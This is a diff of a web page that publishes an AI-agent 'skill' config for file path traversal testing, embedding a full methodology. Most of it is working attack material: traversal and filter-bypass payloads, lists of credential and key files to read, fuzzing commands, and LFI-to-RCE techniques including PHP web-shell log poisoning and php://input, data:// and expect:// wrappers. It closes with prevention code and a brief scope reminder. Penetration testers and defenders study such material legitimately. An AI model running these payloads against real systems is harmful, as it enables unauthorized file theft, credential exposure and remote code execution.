@@ -33,20 +33,15 @@
     .desc{font-size:18px;color:#444;margin-bottom:32px;line-height:1.7}
     .section{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px;margin-bottom:24px}
     .section h2{font-size:20px;font-weight:600;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid #e5e5e5}
-    .install-box{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
-    .install-box p{color:#888;font-size:13px;margin-bottom:8px}
-    .install-box code{display:block;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:14px;word-break:break-all}
+    .copy-box{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
+    .copy-box p{color:#888;font-size:13px;margin-bottom:8px}
+    .copy-box code{display:block;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:14px;word-break:break-all}
     .copy-btn{float:right;padding:8px 16px;background:#fff;color:#1a1a1a;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500}
     .copy-btn:hover{background:#f5f5f5}
     pre{background:#f8f8f8;border:1px solid #e5e5e5;border-radius:12px;padding:20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.5}
-    .how-to{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px}
-    .how-to h2{font-size:20px;font-weight:600;margin-bottom:16px}
-    .how-to ol{margin:16px 0;padding-left:24px}
-    .how-to li{margin-bottom:12px;color:#444}
-    .how-to code{background:#f5f5f5;padding:2px 6px;border-radius:4px;font-size:13px}
     .tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
     .tag{padding:6px 12px;background:#f5f5f5;border-radius:20px;font-size:12px;color:#666}
-    @media(max-width:768px){.header{flex-direction:column}.install-box code{font-size:12px}}
+    @media(max-width:768px){.header{flex-direction:column}.copy-box code{font-size:12px}}
   </style>
 </head>
 <body>
@@ -83,18 +78,503 @@
     <p class="desc">This skill should be used when the user asks to "test for directory traversal", "exploit path traversal vulnerabilities", "read arbitrary files through web applications", "find LFI vulnerabilities", or "access files outside web root". It provides comprehensive file path traversal attack and testing methodologies.</p>
 
     <div class="section">
-      <h2>How to Use</h2>
-      <div class="how-to">
-        <ol>
-          <li><strong>Install via CLI:</strong> Run <code>npx aiccli install skills/file-path-traversal</code> in your terminal</li>
-          <li><strong>Manual install:</strong> Copy the configuration below and add it to your project's config</li>
-        </ol>
-        
-        <div class="install-box">
-          <button class="copy-btn" onclick="copyConfig()">Copy Config</button>
-          <p>Installation Command:</p>
-          <code id="install-cmd">npx aiccli install skills/file-path-traversal</code>
-        </div>
+      <h2>How to Install</h2>
+      <ol style="margin:16px 0;padding-left:24px;color:#444">
+        <li style="margin-bottom:12px"><strong>Copy the config</strong> - Click the "Copy Config" button below</li>
+        <li style="margin-bottom:12px"><strong>Add to your project</strong> - Paste the code into the appropriate config file</li>
+        <li style="margin-bottom:12px"><strong>Done!</strong> - The component is now available in your AI</li>
+      </ol>
+      
+      <div class="copy-box">
+        <button class="copy-btn" onclick="copyConfig()">Copy Config</button>
+        <p>Configuration (click to copy):</p>
+        <code id="install-cmd">---
+name: File Path Traversal Testing
+description: This skill should be used when the user asks to &quot;test for directory traversal&quot;, &quot;exploit path traversal vulnerabilities&quot;, &quot;read arbitrary files through web applications&quot;, &quot;find LFI vulnerabilities&quot;, or &quot;access files outside web root&quot;. It provides comprehensive file path traversal attack and testing methodologies.
+metadata:
+  author: zebbern
+  version: &quot;1.1&quot;
+---
+
+# File Path Traversal Testing
+
+## Purpose
+
+Identify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code. This vulnerability occurs when user-controllable input is passed to filesystem APIs without proper validation.
+
+## Prerequisites
+
+### Required Tools
+- Web browser with developer tools
+- Burp Suite or OWASP ZAP
+- cURL for testing payloads
+- Wordlists for automation
+- ffuf or wfuzz for fuzzing
+
+### Required Knowledge
+- HTTP request/response structure
+- Linux and Windows filesystem layout
+- Web application architecture
+- Basic understanding of file APIs
+
+## Outputs and Deliverables
+
+1. **Vulnerability Report** - Identified traversal points and severity
+2. **Exploitation Proof** - Extracted file contents
+3. **Impact Assessment** - Accessible files and data exposure
+4. **Remediation Guidance** - Secure coding recommendations
+
+## Core Workflow
+
+### Phase 1: Understanding Path Traversal
+
+Path traversal occurs when applications use user input to construct file paths:
+
+```php
+// Vulnerable PHP code example
+$template = &quot;blue.php&quot;;
+if (isset($_COOKIE[&#039;template&#039;]) &amp;&amp; !empty($_COOKIE[&#039;template&#039;])) {
+    $template = $_COOKIE[&#039;template&#039;];
+}
+include(&quot;/home/user/templates/&quot; . $template);
+```
+
+Attack principle:
+- `../` sequence moves up one directory
+- Chain multiple sequences to reach root
+- Access files outside intended directory
+
+Impact:
+- **Confidentiality** - Read sensitive files
+- **Integrity** - Write/modify files (in some cases)
+- **Availability** - Delete files (in some cases)
+- **Code Execution** - If combined with file upload or log poisoning
+
+### Phase 2: Identifying Traversal Points
+
+Map application for potential file operations:
+
+```bash
+# Parameters that often handle files
+?file=
+?path=
+?page=
+?template=
+?filename=
+?doc=
+?document=
+?folder=
+?dir=
+?include=
+?src=
+?source=
+?content=
+?view=
+?download=
+?load=
+?read=
+?retrieve=
+```
+
+Common vulnerable functionality:
+- Image loading: `/image?filename=23.jpg`
+- Template selection: `?template=blue.php`
+- File downloads: `/download?file=report.pdf`
+- Document viewers: `/view?doc=manual.pdf`
+- Include mechanisms: `?page=about`
+
+### Phase 3: Basic Exploitation Techniques
+
+#### Simple Path Traversal
+
+```bash
+# Basic Linux traversal
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+
+# Windows traversal
+..\..\..\windows\win.ini
+..\..\..\..\windows\system32\drivers\etc\hosts
+
+# URL encoded
+..%2F..%2F..%2Fetc%2Fpasswd
+..%252F..%252F..%252Fetc%252Fpasswd  # Double encoding
+
+# Test payloads with curl
+curl &quot;http://target.com/image?filename=../../../etc/passwd&quot;
+curl &quot;http://target.com/download?file=....//....//....//etc/passwd&quot;
+```
+
+#### Absolute Path Injection
+
+```bash
+# Direct absolute path (Linux)
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+
+# Direct absolute path (Windows)
+C:\windows\win.ini
+C:\windows\system32\drivers\etc\hosts
+C:\boot.ini
+```
+
+### Phase 4: Bypass Techniques
+
+#### Bypass Stripped Traversal Sequences
+
+```bash
+# When ../ is stripped once
+....//....//....//etc/passwd
+....\/....\/....\/etc/passwd
+
+# Nested traversal
+..././..././..././etc/passwd
+....//....//etc/passwd
+
+# Mixed encoding
+..%2f..%2f..%2fetc/passwd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+```
+
+#### Bypass Extension Validation
+
+```bash
+# Null byte injection (older PHP versions)
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.png
+
+# Path truncation
+../../../etc/passwd...............................
+
+# Double extension
+../../../etc/passwd.jpg.php
+```
+
+#### Bypass Base Directory Validation
+
+```bash
+# When path must start with expected directory
+/var/www/images/../../../etc/passwd
+
+# Expected path followed by traversal
+images/../../../etc/passwd
+```
+
+#### Bypass Blacklist Filters
+
+```bash
+# Unicode/UTF-8 encoding
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%c1%9c..%c1%9c..%c1%9cetc/passwd
+
+# Overlong UTF-8 encoding
+%c0%2e%c0%2e%c0%af
+
+# URL encoding variations
+%2e%2e/
+%2e%2e%5c
+..%5c
+..%255c
+
+# Case variations (Windows)
+....\\....\\etc\\passwd
+```
+
+### Phase 5: Linux Target Files
+
+High-value files to target:
+
+```bash
+# System files
+/etc/passwd           # User accounts
+/etc/shadow           # Password hashes (root only)
+/etc/group            # Group information
+/etc/hosts            # Host mappings
+/etc/hostname         # System hostname
+/etc/issue            # System banner
+
+# SSH files
+/root/.ssh/id_rsa           # Root private key
+/root/.ssh/authorized_keys  # Authorized keys
+/home/&lt;user&gt;/.ssh/id_rsa    # User private keys
+/etc/ssh/sshd_config        # SSH configuration
+
+# Web server files
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+/etc/apache2/sites-enabled/000-default.conf
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+
+# Application files
+/var/www/html/config.php
+/var/www/html/wp-config.php
+/var/www/html/.htaccess
+/var/www/html/web.config
+
+# Process information
+/proc/self/environ      # Environment variables
+/proc/self/cmdline      # Process command line
+/proc/self/fd/0         # File descriptors
+/proc/version           # Kernel version
+
+# Common application configs
+/etc/mysql/my.cnf
+/etc/postgresql/*/postgresql.conf
+/opt/lampp/etc/httpd.conf
+```
+
+### Phase 6: Windows Target Files
+
+Windows-specific targets:
+
+```bash
+# System files
+C:\windows\win.ini
+C:\windows\system.ini
+C:\boot.ini
+C:\windows\system32\drivers\etc\hosts
+C:\windows\system32\config\SAM
+C:\windows\repair\SAM
+
+# IIS files
+C:\inetpub\wwwroot\web.config
+C:\inetpub\logs\LogFiles\W3SVC1\
+
+# Configuration files
+C:\xampp\apache\conf\httpd.conf
+C:\xampp\mysql\data\mysql\user.MYD
+C:\xampp\passwords.txt
+C:\xampp\phpmyadmin\config.inc.php
+
+# User files
+C:\Users\&lt;user&gt;\.ssh\id_rsa
+C:\Users\&lt;user&gt;\Desktop\
+C:\Documents and Settings\&lt;user&gt;\
+```
+
+### Phase 7: Automated Testing
+
+#### Using Burp Suite
+
+```
+1. Capture request with file parameter
+2. Send to Intruder
+3. Mark file parameter value as payload position
+4. Load path traversal wordlist
+5. Start attack
+6. Filter responses by size/content for success
+```
+
+#### Using ffuf
+
+```bash
+# Basic traversal fuzzing
+ffuf -u &quot;http://target.com/image?filename=FUZZ&quot; \
+     -w /usr/share/wordlists/traversal.txt \
+     -mc 200
+
+# Fuzzing with encoding
+ffuf -u &quot;http://target.com/page?file=FUZZ&quot; \
+     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+     -mc 200,500 -ac
+```
+
+#### Using wfuzz
+
+```bash
+# Traverse to /etc/passwd
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+      --hc 404 \
+      &quot;http://target.com/index.php?file=FUZZ&quot;
+
+# With headers/cookies
+wfuzz -c -z file,traversal.txt \
+      -H &quot;Cookie: session=abc123&quot; \
+      &quot;http://target.com/load?path=FUZZ&quot;
+```
+
+### Phase 8: LFI to RCE Escalation
+
+#### Log Poisoning
+
+```bash
+# Inject PHP code into logs
+curl -A &quot;&lt;?php system(\$_GET[&#039;cmd&#039;]); ?&gt;&quot; http://target.com/
+
+# Include Apache log file
+curl &quot;http://target.com/page?file=../../../var/log/apache2/access.log&amp;cmd=id&quot;
+
+# Include auth.log (SSH)
+# First: ssh &#039;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#039;@target.com
+curl &quot;http://target.com/page?file=../../../var/log/auth.log&amp;cmd=whoami&quot;
+```
+
+#### Proc/self/environ
+
+```bash
+# Inject via User-Agent
+curl -A &quot;&lt;?php system(&#039;id&#039;); ?&gt;&quot; \
+     &quot;http://target.com/page?file=/proc/self/environ&quot;
+
+# With command parameter
+curl -A &quot;&lt;?php system(\$_GET[&#039;c&#039;]); ?&gt;&quot; \
+     &quot;http://target.com/page?file=/proc/self/environ&amp;c=whoami&quot;
+```
+
+#### PHP Wrapper Exploitation
+
+```bash
+# php://filter - Read source code as base64
+curl &quot;http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php&quot;
+
+# php://input - Execute POST data as PHP
+curl -X POST -d &quot;&lt;?php system(&#039;id&#039;); ?&gt;&quot; \
+     &quot;http://target.com/page?file=php://input&quot;
+
+# data:// - Execute inline PHP
+curl &quot;http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&amp;c=id&quot;
+
+# expect:// - Execute system commands
+curl &quot;http://target.com/page?file=expect://id&quot;
+```
+
+### Phase 9: Testing Methodology
+
+Structured testing approach:
+
+```bash
+# Step 1: Identify potential parameters
+# Look for file-related functionality
+
+# Step 2: Test basic traversal
+../../../etc/passwd
+
+# Step 3: Test encoding variations
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Step 4: Test bypass techniques
+....//....//....//etc/passwd
+..;/..;/..;/etc/passwd
+
+# Step 5: Test absolute paths
+/etc/passwd
+
+# Step 6: Test with null bytes (legacy)
+../../../etc/passwd%00.jpg
+
+# Step 7: Attempt wrapper exploitation
+php://filter/convert.base64-encode/resource=index.php
+
+# Step 8: Attempt log poisoning for RCE
+```
+
+### Phase 10: Prevention Measures
+
+Secure coding practices:
+
+```php
+// PHP: Use basename() to strip paths
+$filename = basename($_GET[&#039;file&#039;]);
+$path = &quot;/var/www/files/&quot; . $filename;
+
+// PHP: Validate against whitelist
+$allowed = [&#039;report.pdf&#039;, &#039;manual.pdf&#039;, &#039;guide.pdf&#039;];
+if (in_array($_GET[&#039;file&#039;], $allowed)) {
+    include(&quot;/var/www/files/&quot; . $_GET[&#039;file&#039;]);
+}
+
+// PHP: Canonicalize and verify base path
+$base = &quot;/var/www/files/&quot;;
+$realBase = realpath($base);
+$userPath = $base . $_GET[&#039;file&#039;];
+$realUserPath = realpath($userPath);
+
+if ($realUserPath &amp;&amp; strpos($realUserPath, $realBase) === 0) {
+    include($realUserPath);
+}
+```
+
+```python
+# Python: Use os.path.realpath() and validate
+import os
+
+def safe_file_access(base_dir, filename):
+    # Resolve to absolute path
+    base = os.path.realpath(base_dir)
+    file_path = os.path.realpath(os.path.join(base, filename))
+    
+    # Verify file is within base directory
+    if file_path.startswith(base):
+        return open(file_path, &#039;r&#039;).read()
+    else:
+        raise Exception(&quot;Access denied&quot;)
+```
+
+## Quick Reference
+
+### Common Payloads
+
+| Payload | Target |
+|---------|--------|
+| `../../../etc/passwd` | Linux password file |
+| `..\..\..\..\windows\win.ini` | Windows INI file |
+| `....//....//....//etc/passwd` | Bypass simple filter |
+| `/etc/passwd` | Absolute path |
+| `php://filter/convert.base64-encode/resource=config.php` | Source code |
+
+### Target Files
+
+| OS | File | Purpose |
+|----|------|---------|
+| Linux | `/etc/passwd` | User accounts |
+| Linux | `/etc/shadow` | Password hashes |
+| Linux | `/proc/self/environ` | Environment vars |
+| Windows | `C:\windows\win.ini` | System config |
+| Windows | `C:\boot.ini` | Boot config |
+| Web | `wp-config.php` | WordPress DB creds |
+
+### Encoding Variants
+
+| Type | Example |
+|------|---------|
+| URL Encoding | `%2e%2e%2f` = `../` |
+| Double Encoding | `%252e%252e%252f` = `../` |
+| Unicode | `%c0%af` = `/` |
+| Null Byte | `%00` |
+
+## Constraints and Limitations
+
+### Permission Restrictions
+- Cannot read files application user cannot access
+- Shadow file requires root privileges
+- Many files have restrictive permissions
+
+### Application Restrictions
+- Extension validation may limit file types
+- Base path validation may restrict scope
+- WAF may block common payloads
+
+### Testing Considerations
+- Respect authorized scope
+- Avoid accessing genuinely sensitive data
+- Document all successful access
+
+## Troubleshooting
+
+| Problem | Solutions |
+|---------|-----------|
+| No response difference | Try encoding, blind traversal, different files |
+| Payload blocked | Use encoding variants, nested sequences, case variations |
+| Cannot escalate to RCE | Check logs, PHP wrappers, file upload, session poisoning |
+</code>
       </div>
     </div>
 
